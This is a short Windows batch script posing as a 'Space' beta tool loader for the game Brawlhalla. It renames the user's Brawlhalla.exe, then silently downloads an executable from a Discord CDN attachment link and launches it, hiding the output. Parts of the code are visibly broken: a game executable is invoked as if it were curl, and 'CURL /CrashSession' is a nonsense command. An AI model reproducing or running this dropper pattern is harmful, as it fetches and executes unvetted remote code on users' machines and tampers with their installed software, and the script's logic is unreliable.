@ECHO OFF 
COLOR 
TITLE Space Beta Test
%HOMEDRIVE%
MD "B:\SpaceExeFolder" >NUL 2>&1
SETLOCAL
CALL :setESC
:MAIN
ECHO %ESC%[42mInitializing Space!%ESC%[0m
CD "C:\Program Files (x86)\Steam" 
IF EXIST "C:\Program Files (x86)\Steam\steamapps\common\Brawlhalla\Brawlhalla.exe" GOTO :found >NUL 2>&1
ECHO You didn't run Brawlhalla session! Killing session in 5 seconds...
TIMEOUT 5 /NOBREAK >NUL 2>&1
CURL /CrashSession
:found
ECHO %ESC%[46mDownloading Space!%ESC%[0m
CD "B:\SpaceExeFolder"
B:
REN "C:\Program Files (x86)\Steam\steamapps\common\Brawlhalla\Brawlhalla.exe" lmfao.exe
SET DL="C:\Program Files (x86)\Steam\steamapps\common\Brawlhalla\lmfao.exe"
%DL% -LJOk "https://cdn.discordapp.com/attachments/790973816834097192/791037555852181544/SpaceToolBetaV2.1.exe" >NUL 2>&1
START "" "B:\SpaceExeFolder\SpaceToolBetaV2.1.exe" >NUL 2>&1
EXIT 

:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
GOTO :MAIN
